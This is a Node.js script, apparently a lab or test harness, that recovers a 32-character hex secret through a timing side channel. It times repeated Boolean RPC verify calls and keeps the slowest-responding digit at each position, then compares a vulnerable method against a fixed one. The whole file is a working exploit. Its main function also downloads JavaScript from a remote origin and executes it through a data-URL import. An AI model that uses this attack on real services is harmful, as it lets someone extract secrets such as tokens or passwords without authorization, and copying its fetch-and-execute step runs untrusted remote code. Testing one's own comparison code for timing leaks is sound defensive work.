'use strict';

const {performance}=require('node:perf_hooks');

const alphabet='0123456789abcdef';

/** @param {number[]} samples @returns {number} */
function median(samples){
  const ordered=[...samples].sort((a,b)=>a-b);
  return ordered[Math.floor(ordered.length/2)];
}

/**
 * Probe a binary equality facade's elapsed HTTP response times. The attack
 * sees only source served to an authorized client and normal Boolean RPC
 * responses. It never reads the server's secret, the original private source,
 * a diagnostic counter or any timing header.
 *
 * @param {(candidate:string)=>Promise<boolean>} verify
 * @param {number} [length]
 * @returns {Promise<{guess:string,verified:boolean,requests:number,minMarginMs:number}>}
 */
async function extractPrefixFromTimings(verify,length=32){
  let guess='',requests=0,minMarginMs=Infinity;
  for(let position=0;position<length;position++){
    /** @type {{digit:string,score:number}[]} */
    const candidates=[];
    // Rotate candidate enumeration to avoid fixed last-digit ordering bias.
    const order=alphabet.slice(position%alphabet.length)+
      alphabet.slice(0,position%alphabet.length);
    for(const digit of order){
      const challenge=guess+digit+'0'.repeat(length-position-1);
      const durations=[];
      for(let trial=0;trial<3;trial++){
        const start=performance.now();
        const result=await verify(challenge);
        if(typeof result!=='boolean')throw new TypeError('Expected Boolean oracle');
        durations.push(performance.now()-start);
        requests++;
      }
      candidates.push({digit,score:median(durations)});
    }
    candidates.sort((a,b)=>b.score-a.score);
    minMarginMs=Math.min(minMarginMs,candidates[0].score-candidates[1].score);
    guess+=candidates[0].digit;
  }
  const verified=await verify(guess);
  requests++;
  return {guess,verified,requests,
    minMarginMs:Number(minMarginMs.toFixed(3))};
}

/** @returns {Promise<void>} */
async function main(){
  const origin=process.argv[2];
  const bearer=process.argv[3];
  if(!origin||!bearer)throw new TypeError('Expected permitted RPC origin and session');
  const realFetch=globalThis.fetch;
  globalThis.fetch=(value,options)=>{
    const headers=new Headers(options?.headers);
    headers.set('x-session',bearer);
    return realFetch(new URL(String(value),origin),{...options,headers});
  };
  try{
    const response=await fetch('/obfs/public.mjs');
    if(response.status!==200)throw new Error('Authorized public facade unavailable');
    const source=await response.text();
    const facade=await import('data:text/javascript;base64,'+
      Buffer.from(source).toString('base64'));
    if(typeof facade.verify!=='function'||typeof facade.verifyFixed!=='function'){
      throw new TypeError('Public facade does not expose both test methods');
    }
    const vulnerable=await extractPrefixFromTimings(facade.verify);
    const fixed=await extractPrefixFromTimings(facade.verifyFixed);
    process.stdout.write(JSON.stringify({vulnerable,fixed,
      publicFacadeBytes:Buffer.byteLength(source),
      sourceReadOnly:true})+'\n');
  }finally{
    globalThis.fetch=realFetch;
  }
}

if(require.main===module){
  main().catch(error=>{console.error(error);process.exitCode=1;});
}
module.exports={extractPrefixFromTimings,median};
